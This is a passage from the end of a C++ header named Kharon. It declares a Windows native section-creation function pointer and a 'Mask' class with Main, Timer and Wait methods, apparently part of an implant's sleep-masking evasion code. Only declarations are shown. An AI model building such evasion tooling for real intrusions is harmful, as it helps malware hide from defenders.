        _In_ ULONG SectionPageProtection, _In_ ULONG AllocationAttributes, _In_opt_ HANDLE FileHandle
    ) -> LONG;

};

class Mask {
private:
    Root::Kharon* Self;
public:
    Mask( Root::Kharon* KharonRf ) : Self( KharonRf ) {};;

    auto Main(  _In_ ULONG Time ) -> BOOL;
    auto Timer( _In_ ULONG Time ) -> BOOL;
    auto Wait(  _In_ ULONG Time ) -> BOOL;
};

#endif // KHARON_H
